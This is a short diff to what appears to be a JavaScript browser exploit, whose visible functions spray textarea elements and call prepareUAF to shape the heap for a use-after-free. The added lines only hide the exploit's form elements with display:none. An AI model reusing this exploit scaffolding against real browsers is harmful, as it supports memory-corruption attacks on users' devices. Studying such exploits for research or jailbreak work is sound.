@@ -416,6 +416,7 @@ function sprayHTMLTextArea() {
 	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
+    textarea_div_elem.style.cssText = "display: none;"
 	var element = document.createElement("textarea");
 
 	/* Add a style to avoid textarea display */
@@ -446,4 +447,9 @@ function go() {
 	g_input = input1;
 	/* Shape heap layout for obj. reuse */
 	prepareUAF();
+    g_input.style.cssText = "display: none;"
+    document.getElementById("input2").style.cssText = "display: none;"
+    document.getElementById("input3").style.cssText = "display: none;"
+    document.getElementById("select1").style.cssText = "display: none;"
+    //document.getElementById("").style.cssText = "display: none;"
 }
